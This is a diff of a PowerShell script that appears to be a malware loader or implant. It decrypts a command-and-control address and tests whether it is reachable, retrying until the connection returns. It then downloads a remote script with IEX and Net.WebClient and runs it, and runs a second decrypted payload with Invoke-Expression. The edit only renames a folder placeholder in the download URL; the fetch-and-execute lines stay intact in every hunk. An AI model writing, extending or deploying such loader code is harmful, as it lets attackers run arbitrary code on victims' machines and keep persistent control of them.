@@ -88,7 +88,7 @@ if ($t -eq $True) {
 	[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted 
 	$uconnect = TestURLstatus -URL $c2c
 		if ($uconnect -eq $True) { # test URL of c2, if TRUE, run PAYLOAD
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pntx.ps1"))
+			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
 			$decrypted = de PASSCRYPT SALT
 			Invoke-Expression $decrypted	
 		}
@@ -102,7 +102,7 @@ if ($t -eq $True) {
 					break
 				}
 			} # Once URL become active again, run PAYLOAD
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pntx.ps1"))
+			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
 			$decrypted = de PASSCRYPT SALT
 			Invoke-Expression $decrypted			
 		}		
@@ -119,7 +119,7 @@ else { # Test internet connexion. If FALSE, try until connexion are UP and retre
 	[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted 
 	$uconnect = TestURLstatus -URL $c2c
 		if ($uconnect -eq $True) { # test URL c2
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pntx.ps1"))
+			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
 			$decrypted = de PASSCRYPT SALT
 			Invoke-Expression $decrypted	
 		}
@@ -133,7 +133,7 @@ else { # Test internet connexion. If FALSE, try until connexion are UP and retre
 					break
 				}
 			}
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pntx.ps1"))
+			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
 			$decrypted = de PASSCRYPT SALT
 			Invoke-Expression $decrypted			
 		}	
